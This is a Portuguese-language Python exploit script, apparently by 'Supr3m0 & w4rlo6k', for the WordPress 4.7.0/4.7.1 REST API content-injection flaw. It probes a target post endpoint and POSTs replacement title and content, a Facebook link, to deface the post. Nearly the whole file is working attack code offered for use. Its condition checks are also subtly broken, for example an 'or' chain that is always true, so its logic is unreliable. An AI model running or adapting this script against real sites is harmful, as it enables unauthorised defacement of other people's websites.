#!/usr/bin/python
#-*- coding: utf-8 -*-
import colorama
from colorama import Fore, Back, Style
import requests
import sys
import json
pay_user = "www.facebook.com/yunkers01" # MENSAGEM QUE SUBSTITUIRA O POST
menu = """
__  __            __                  ______   Recoda nao comedia!              
\ \/ /_  ______  / /_____  __________/ ____/_______ _      __
 \  / / / / __ \/ //_/ _ \/ ___/ ___/ /   / ___/ _ \ | /| / /
 / / /_/ / / / / ,< /  __/ /  (__  ) /___/ /  /  __/ |/ |/ / 
/_/\__,_/_/ /_/_/|_|\___/_/  /____/\____/_/   \___/|__/|__/  
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
 # Wordpress 4.7.0 / 4.7.1 Content Injection exploit
 # Escrito por Supr3m0 & w4rlo6k
 # Contato: www.facebook.com/yunkers01/
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"""
x = sys.argv
if len(x) == 5:
	if x[1] == "--url":
		url = x[2]
	else:
		print(Fore.GREEN + menu)
		print(Fore.RED + "[ERRO]" + Fore.WHITE +" Parametros invalidos!\n    use: python exploit.py --url http(s)://site.com/wordpress --post (numero do post. ex: 1992)")
		exit()
	if x[3] == "--post":
		postid = x[4]
	else:
		print(Fore.GREEN + menu)
		print(Fore.RED + "[ERRO]" + Fore.WHITE +" Parametros invalidos!\n    use: python exploit.py --url http(s)://site.com/wordpress --post (numero do post. ex: 1992)")
		exit()
	if url[:8] != "https://" and url[:7] != "http://":
		print(Fore.GREEN + menu)
		print(Fore.RED + "[ERRO]" + Fore.WHITE + " URL invalida. (Insira o protocolo 'http' ou 'https'.)")
		exit()
else:
	print(Fore.GREEN + menu)
	print(Fore.RED + "[ERRO]" + Fore.WHITE +" Parametros invalidos!\n    use: python exploit.py --url http(s)://site.com/wordpress --post (numero do post. ex: 1992)")
	exit()
print(Fore.GREEN + menu)
print(Fore.GREEN + "[INFO]" + Fore.WHITE + " Verificando se o site esta vulneravel(...)")

dir_vulneravel = url + "/wp-json/wp/v2/posts/{}".format(postid)
try:
	checa = requests.get(dir_vulneravel)
	if checa.status_code != 403:
		vuln = "status" and "id" and "title"
		if vuln in checa.text:
			print(Fore.GREEN + "[INFO] "+ Fore.WHITE +"Site parece ser vulneravel, enviando payload(...)")
		else:
			print(Fore.RED + "[ERRO]" + Fore.WHITE + " Site nao vulneravel. (Nao encontrei o 'json'")
			print(checa.text)
			exit()
	else:
		print(Fore.RED + "[ERRO]" + Fore.WHITE + " Nao consegui me conectar a URL.")
		exit()
except Exception as e:
	print(Fore.RED + "[ERRO]" + Fore.WHITE + " Erro ao se conectar.")
	exit()
try:
	vuln_data = {"title" : pay_user,
				 "content" : pay_user}
	injeta = requests.post(dir_vulneravel, data=vuln_data)
	if injeta.status_code != 403:
		if "error" or "403" or "rest_cannot_edit" or "401" in injeta.text:
			print(Fore.RED + "[ERRO]" + Fore.WHITE + " Site nao vulneravel. (Sem permissao para alterar o post)")
			print(Fore.YELLOW + "Site retornou: " + Fore.WHITE + injeta.text)
			exit()
		else:
			print(Fore.GREEN + "[SUCESSO]" + Fore.WHITE + " Site vulneravel! (Post {} alterado com sucesso!)".format(postid))
			print(injeta.text)
			exit()
	else:
		print(Fore.RED + "[ERRO]" + Fore.WHITE + " Nao consegui me conectar a URL.")
		exit()
except Exception as e:
	print(Fore.RED + "[ERRO]" + Fore.WHITE + " Erro ao se conectar.")
	exit()